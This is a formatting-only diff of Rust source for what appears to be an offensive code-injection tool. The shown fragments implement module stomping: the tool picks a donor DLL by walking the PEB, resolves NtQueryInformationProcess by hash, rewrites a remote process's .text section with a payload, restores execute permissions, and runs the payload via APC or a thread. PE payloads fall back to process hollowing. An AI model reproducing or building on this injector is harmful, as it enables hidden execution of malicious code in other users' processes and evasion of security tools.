@@ -326,9 +326,7 @@ unsafe fn collect_peb_candidates(
                 }
 
                 // Look for .text section.
-                if &sec.Name[..5] == b".text"
-                    && *sec.Misc.VirtualSize() as usize >= min_text_size
-                {
+                if &sec.Name[..5] == b".text" && *sec.Misc.VirtualSize() as usize >= min_text_size {
                     candidates.push(DonorDll {
                         name: name_str.clone(),
                         base: dll_base,
@@ -361,10 +359,7 @@ unsafe fn collect_peb_candidates(
 /// 3. If no preferred donor is found, fall back to the smallest fitting
 ///    candidate from the full list
 #[cfg(windows)]
-fn select_donor<'a>(
-    candidates: &'a [DonorDll],
-    payload_len: usize,
-) -> Option<&'a DonorDll> {
+fn select_donor<'a>(candidates: &'a [DonorDll], payload_len: usize) -> Option<&'a DonorDll> {
     if candidates.is_empty() {
         return None;
     }
@@ -410,8 +405,8 @@ unsafe fn try_execute_via_apc(
     exec_addr: *mut winapi::ctypes::c_void,
 ) -> bool {
     use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32};
-    use winapi::um::winnt::THREAD_SET_CONTEXT;
     use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
+    use winapi::um::winnt::THREAD_SET_CONTEXT;
 
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
@@ -551,17 +546,14 @@ unsafe fn execute_via_thread(
 impl Injector for ExistingModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
         use winapi::um::winnt::{
-            PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
-            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
-            PROCESS_VM_WRITE,
+            PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
+            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
         };
 
         // If payload is a PE, delegate to process hollowing.
         let is_pe = payload_has_valid_pe_headers(payload);
         if is_pe {
-            log::info!(
-                "ExistingModuleStomp: PE payload detected, forwarding to process hollowing"
-            );
+            log::info!("ExistingModuleStomp: PE payload detected, forwarding to process hollowing");
             return match hollowing::windows_impl::inject_into_process(pid, payload) {
                 Ok(_) => Ok(()),
                 Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
@@ -636,8 +628,10 @@ impl Injector for ExistingModuleStompInjector {
                 .ok_or_else(|| anyhow!("ExistingModuleStomp: ntdll not found via PEB walk"))?;
 
             let ntqip_hash = pe_resolve::hash_str(b"NtQueryInformationProcess\0");
-            let ntqip_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ntqip_hash)
-                .ok_or_else(|| anyhow!("ExistingModuleStomp: NtQueryInformationProcess not found"))?;
+            let ntqip_ptr =
+                pe_resolve::get_proc_address_by_hash(ntdll, ntqip_hash).ok_or_else(|| {
+                    anyhow!("ExistingModuleStomp: NtQueryInformationProcess not found")
+                })?;
 
             type NtQueryInfoProcess = unsafe extern "system" fn(
                 winapi::shared::ntdef::HANDLE,
@@ -725,12 +719,7 @@ impl Injector for ExistingModuleStompInjector {
             }
 
             // ── Step 6: Change .text to PAGE_READWRITE ───────────────────
-            let rw_status = nt_protect_proc!(
-                h_proc,
-                text_addr,
-                payload.len(),
-                PAGE_READWRITE
-            );
+            let rw_status = nt_protect_proc!(h_proc, text_addr, payload.len(), PAGE_READWRITE);
             if rw_status < 0 {
                 cleanup_and_err!(
                     "ExistingModuleStomp: NtProtectVirtualMemory(RW) on {}.text failed: status {:#x}",
@@ -761,12 +750,7 @@ impl Injector for ExistingModuleStompInjector {
             }
 
             // ── Step 8: Restore .text to PAGE_EXECUTE_READ ───────────────
-            let rx_status = nt_protect_proc!(
-                h_proc,
-                text_addr,
-                payload.len(),
-                PAGE_EXECUTE_READ
-            );
+            let rx_status = nt_protect_proc!(h_proc, text_addr, payload.len(), PAGE_EXECUTE_READ);
             if rx_status < 0 {
                 cleanup_and_err!(
                     "ExistingModuleStomp: NtProtectVirtualMemory(RX) on {}.text failed: status {:#x}",
